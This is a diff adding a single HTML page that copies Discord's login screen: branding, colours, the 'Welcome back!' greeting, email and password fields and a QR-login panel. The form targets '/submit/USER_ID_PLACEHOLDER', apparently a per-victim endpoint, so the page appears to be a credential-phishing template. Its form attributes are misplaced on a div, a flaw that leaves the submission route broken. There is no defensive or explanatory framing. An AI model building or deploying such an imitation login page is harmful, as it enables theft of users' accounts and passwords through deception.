@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: "gg sans", "Noto Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #5865f2;
+            background: url("data:image/svg+xml,%3Csvg width='1920' height='1080' viewBox='0 0 1920 1080' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M870.515 -100.123L1920 -87V1080H0V-100.123L870.515 -100.123Z' fill='%2336393F'/%3E%3C/svg%3E%0A") no-repeat;
+            background-position: center;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background-color: #36393f;
+            border-radius: 5px;
+            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
+            padding: 32px;
+            width: 480px;
+            color: #dcddde;
+        }
+        .login-heading {
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .login-heading h1 {
+            color: #ffffff;
+            font-size: 24px;
+            line-height: 30px;
+            font-weight: 600;
+        }
+        .login-subheading {
+            color: #b9bbbe;
+            font-size: 16px;
+            line-height: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            color: #b9bbbe;
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+        }
+        .input-field {
+            background-color: #202225;
+            border: none;
+            border-radius: 3px;
+            color: #dcddde;
+            font-size: 16px;
+            height: 40px;
+            padding: 10px;
+            width: 100%;
+            transition: border-color 0.2s ease-in-out;
+            outline: none;
+        }
+        .input-field:focus {
+            box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.6);
+            border-color: #7289da;
+        }
+        .input-field::placeholder {
+            color: #72767d;
+        }
+        .forgot-password {
+            color: #00aff4;
+            font-size: 14px;
+            display: block;
+            margin-top: 4px;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .login-button {
+            background-color: #5865f2;
+            border: none;
+            border-radius: 3px;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 500;
+            height: 44px;
+            margin-top: 16px;
+            width: 100%;
+            transition: background-color 0.2s ease-in-out;
+        }
+        .login-button:hover {
+            background-color: #4752c4;
+        }
+        .qr-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-left: 32px;
+            text-align: center;
+        }
+        .qr-placeholder {
+            background-color: white;
+            border-radius: 4px;
+            padding: 8px;
+            margin-bottom: 16px;
+            width: 176px;
+            height: 176px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-heading {
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .qr-text {
+            color: #b9bbbe;
+            font-size: 16px;
+            line-height: 20px;
+        }
+        .needs-account {
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        .register-link {
+            color: #00aff4;
+            text-decoration: none;
+        }
+        .register-link:hover {
+            text-decoration: underline;
+        }
+        .main-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 784px;
+        }
+        @media (max-width: 830px) {
+            .main-container {
+                width: 480px;
+            }
+            .qr-container {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-container">
+        <div class="login-container">
+            <div class="login-heading">
+                <h1>Welcome back!</h1>
+            </div>
+            <div class="login-subheading">
+                We're so excited to see you again!
+            </div>
+            <form>
+                <div class="form-group" method="post" action="/submit/USER_ID_PLACEHOLDER">
+                    <label for="email">Email or Phone Number</label>
+                    <input type="text" id="email" class="input-field" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" class="input-field" required>
+                    <a href="#" class="forgot-password">Forgot your password?</a>
+                </div>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="needs-account">
+                Need an account? <a href="#" class="register-link">Register</a>
+            </div>
+        </div>
+        <div class="qr-container">
+            <div class="qr-placeholder">
+                <svg width="120" height="120" viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="120" height="120" fill="#5865F2"/>
+                    <path d="M42.4262 31.2695C43.2559 29.9922 44.6367 29.1914 46.1875 29.1914C48.9434 29.1914 51.1699 31.418 51.1699 34.1738C51.1699 36.9297 48.9434 39.1562 46.1875 39.1562C43.4316 39.1562 41.2051 36.9297 41.2051 34.1738C41.2051 33.1582 41.5723 32.1426 42.4262 31.2695ZM67.6367 52.9492C71.1953 52.9492 74.0977 56.2363 74.0977 60.1816C74.0977 64.127 71.1953 67.4141 67.6367 67.4141C64.0781 67.4141 61.1758 64.127 61.1758 60.1816C61.1758 56.3633 64.0781 52.9492 67.6367 52.9492ZM89.8926 52.9492C93.4512 52.9492 96.3535 56.2363 96.3535 60.1816C96.3535 64.127 93.4512 67.4141 89.8926 67.4141C86.334 67.4141 83.4316 64.127 83.4316 60.1816C83.4316 56.3633 86.334 52.9492 89.8926 52.9492ZM67.5098 29.1914C69.0605 29.1914 70.4414 29.9922 71.2711 31.2695C72.125 32.1426 72.4922 33.1582 72.4922 34.1738C72.4922 36.9297 70.2656 39.1562 67.5098 39.1562C64.7539 39.1562 62.5273 36.9297 62.5273 34.1738C62.5273 31.418 64.7539 29.1914 67.5098 29.1914ZM30.1172 52.9492C33.6758 52.9492 36.5781 56.2363 36.5781 60.1816C36.5781 64.127 33.6758 67.4141 30.1172 67.4141C26.5586 67.4141 23.6562 64.127 23.6562 60.1816C23.6562 56.3633 26.5586 52.9492 30.1172 52.9492ZM37.8223 78.1445C41.7676 78.1445 44.0488 82.0898 42.8516 85.6484L42.6152 86.2324C40.9551 90.1777 36.3242 92.3496 32.3789 90.6895C28.4336 89.0293 26.2617 84.3984 27.9219 80.4531L28.1582 79.8691C29.1191 78.6172 30.6152 77.8965 32.1113 77.8965L37.8223 78.1445ZM79.9922 78.1445C80.5762 78.0176 81.2871 77.9629 81.8711 78.0176C83.9336 78.1445 85.5391 79.5801 85.9609 81.5566C86.041 82.0312 86.0957 82.5059 86.041 82.9805L85.8594 85.0977C85.6777 87.3242 83.8359 89.0391 81.6094 89.166C79.3828 89.293 77.4863 87.6328 77.3047 85.4062L77.1777 83.3398C77.123 82.9199 77.123 82.5 77.1777 82.0801C77.4316 79.7988 79.4629 78.1445 81.7441 78.1445H79.9922ZM59.9922 78.1445C63.9375 78.1445 66.2188 82.0898 65.0215 85.6484L64.7852 86.2324C63.125 90.1777 58.4941 92.3496 54.5488 90.6895C50.6035 89.0293 48.4316 84.3984 50.0918 80.4531L50.3281 79.8691C51.2891 78.6172 52.7852 77.8965 54.2812 77.8965L59.9922 78.1445Z" fill="white"/>
+                </svg>
+            </div>
+            <h2 class="qr-heading">Log in with QR Code</h2>
+            <p class="qr-text">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
+        </div>
+    </div>
+</body>
+</html>
